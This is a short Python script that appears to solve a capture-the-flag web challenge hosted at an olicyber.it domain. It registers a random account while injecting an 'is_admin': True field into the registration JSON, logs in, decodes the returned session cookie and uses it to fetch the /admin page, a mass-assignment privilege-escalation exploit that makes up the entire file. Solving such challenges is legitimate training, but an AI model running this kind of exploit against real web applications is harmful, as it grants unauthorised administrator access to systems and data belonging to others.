import requests
from urllib import parse
import random
from string import ascii_lowercase 

url = "http://useless-panel-reborn.challs.olicyber.it"

s = ''.join(random.sample(ascii_lowercase, 10))

json = {
    "username": s,
    "password": s,
    "is_admin": True,
}

r = requests.post(f"{url}/api/register", json=json) 
print(r.text)

r = requests.post(f"{url}/api/login", json=json) 
print(r.text)

raw_cookie = parse.unquote(r.cookies.get("connect.sid"))

print(raw_cookie)

cookies = {
    "connect.sid": raw_cookie
}

r = requests.get(f"{url}/admin", cookies=cookies)
print(r.text)
